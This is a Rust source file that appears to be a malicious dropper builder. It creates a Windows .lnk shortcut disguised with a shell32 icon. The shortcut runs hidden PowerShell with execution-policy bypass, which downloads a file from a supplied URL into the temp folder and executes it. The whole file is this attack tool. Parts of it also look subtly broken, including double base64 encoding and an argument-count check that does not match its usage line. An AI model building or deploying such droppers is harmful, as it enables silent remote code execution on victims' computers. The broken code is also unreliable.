use std::process::{Command, Stdio};
use std::io::{Write, Read};
use std::fs::File;
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 8 {
        eprintln!("Error: invalid number of arguments. Usage: exploit -p <payload> -l <link> -s <save.type> -i <icon>");
        std::process::exit(1);
    }

    let mut url = "";
    let mut save = "";
    let mut icon = "";
    let mut cmd = "";

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-l" => {
                url = args[i+1].as_str();
            },
            "-s" => {
                save = args[i+1].as_str();
            },
            "-i" => {
                icon = args[i+1].as_str();
            },
            "-p" => {
                cmd = args[i+1].as_str();
            },
            _ => {},
        }
        i += 2;
    }

    if cmd == "download" && url != "" && save != "" {
        let payload = base64_payload(url, save);
        make_payload(generate_payload(&payload), "exploit", icon);
    } else {
        eprintln!("Error: invalid arguments or command type.");
        std::process::exit(1);
    }
}

fn base64_payload(url: &str, save: &str) -> String {
    let endata = format!("(New-Object System.Net.WebClient).DownloadFile(\"{}\", \"$env:temp\\{}\");[System.Diagnostics.Process]::Start(\"$env:temp\\{}\");", url, save, save);
    base64::encode(endata)
}

fn generate_payload(payload: &str) -> String {
    let encoded_payload = base64::encode(payload.as_bytes());
    format!("powershell -NonI -W Hidden -NoP -Exec Bypass -EncodedCommand {}", encoded_payload)
}

fn make_payload(string: String, name: &str, icon: &str) {
    let payload = format!("$WshShell = New-Object -ComObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('{}.lnk');$Shortcut.TargetPath = 'cmd.exe';$Shortcut.Arguments =' /c {}';$Shortcut.IconLocation = 'shell32.dll,{}';$Shortcut.Save()", name, string, icon);

    let mut child = Command::new("powershell")
        .args(&["-EncodedCommand", &base64::encode(payload.as_bytes())])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to spawn powershell process");

    let output = child.wait_with_output().expect("Failed to wait for powershell process");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !stdout.is_empty() {
        println!("{}", stdout);
    }

    if !stderr.is_empty() {
        eprintln!("{}", stderr);
    }

    println!("File saved: {}", std::env::current_dir().unwrap().to_str().unwrap());
}
